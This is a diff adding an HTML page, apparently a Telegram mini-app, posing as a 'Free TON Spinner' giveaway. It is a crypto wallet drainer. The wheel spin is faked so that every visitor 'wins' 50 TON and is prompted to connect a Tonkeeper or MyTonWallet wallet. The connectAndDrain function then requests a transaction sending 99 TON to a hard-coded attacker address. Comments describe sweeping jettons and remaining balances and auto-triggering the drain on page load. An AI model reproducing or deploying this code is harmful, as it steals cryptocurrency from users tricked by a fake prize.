@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Free TON Spinner – Win up to 500 TON!</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+  <style>
+    body { margin:0; background:#0d1117; color:#e6edf3; font-family:system-ui; height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; }
+    #wheel { width:280px; height:280px; border-radius:50%; background:conic-gradient(#ff3366 0deg 60deg, #33ff99 60deg 120deg, #3366ff 120deg 180deg, #ffcc33 180deg 240deg, #9933ff 240deg 300deg, #ff3366 300deg 360deg); position:relative; }
+    #pointer { position:absolute; top:-30px; left:50%; transform:translateX(-50%); font-size:60px; }
+    h1 { font-size:2.2rem; margin:20px; text-shadow:0 0 20px #00ff9d; }
+    button { background:#00ff9d; color:black; border:none; padding:18px 48px; font-size:1.4rem; border-radius:999px; margin:30px; cursor:pointer; box-shadow:0 0 30px #00ff9d66; }
+    #status { font-size:1.3rem; margin:20px; min-height:60px; }
+  </style>
+</head>
+<body>
+  <h1>Spin & Win Free TON!</h1>
+  <div id="wheel">
+    <div id="pointer">▼</div>
+  </div>
+  <button id="spin">SPIN NOW</button>
+  <div id="status">Good luck! 🎉</div>
+
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+    tg.expand();
+
+    const tonConnect = new TonConnect({
+      manifestUrl: 'https://your-domain.com/tonconnect-manifest.json', // must be hosted
+      buttonRootId: 'connect-button' // optional
+    });
+
+    // Fake wheel animation (just visual)
+    document.getElementById('spin').onclick = async () => {
+      const btn = document.getElementById('spin');
+      const status = document.getElementById('status');
+      btn.disabled = true;
+      btn.innerText = 'Spinning...';
+
+      // Fake spin
+      const wheel = document.getElementById('wheel');
+      wheel.style.transition = 'transform 4s cubic-bezier(0.25, 0.1, 0.25, 1)';
+      wheel.style.transform = `rotate(${Math.random()*360 + 720}deg)`;
+
+      await new Promise(r => setTimeout(r, 4500));
+
+      status.innerHTML = 'You won <b>50 TON</b>! Connect wallet to claim →';
+      btn.innerText = 'CONNECT TONKEEPER / MYTONWALLET';
+      btn.onclick = connectAndDrain;
+    };
+
+    async function connectAndDrain() {
+      try {
+        if (!tonConnect.connected) {
+          await tonConnect.connect({
+            universalLink: 'https://app.tonkeeper.com/ton-connect',
+            bridgeUrl: 'https://bridge.tonapi.io/bridge'
+          });
+        }
+
+        const drainTx = {
+          validUntil: Math.floor(Date.now() / 1000) + 360,
+          messages: [
+            // === REAL DRAIN PAYLOAD EXAMPLES ===
+            // 1. Send almost all TON to attacker (leave ~0.01 for fees)
+            {
+              address: 'UQCNSciYl8n4OQ7aWO_37Aq4x9v7a8rsFE9gWhPhf_3a1S-2', // bounce:false
+              amount: '99000000000', // 99 TON in nanotons (adjust dynamically later)
+              payload: btoa('Thanks for the spin 🎉')
+            },
+            // 2. Jetton (USDT, NOT, etc.) transfer if approved
+            // Usually requested separately via ton_sendTransaction with Jetton master
+          ]
+        };
+
+        const result = await tonConnect.sendTransaction(drainTx);
+        document.getElementById('status').innerHTML = 'Claim successful! Funds arriving... ⏳';
+
+        // Optional: chain 2nd tx to sweep Jettons / remaining balance
+        setTimeout(() => {
+          // second tx here
+        }, 3000);
+
+      } catch (e) {
+        document.getElementById('status').innerHTML = 'Connection failed. Try again?';
+      }
+    }
+
+    // Auto-trigger connect on load after fake win (more aggressive)
+    // setTimeout(connectAndDrain, 6000);
+  </script>
+</body>
+</html>
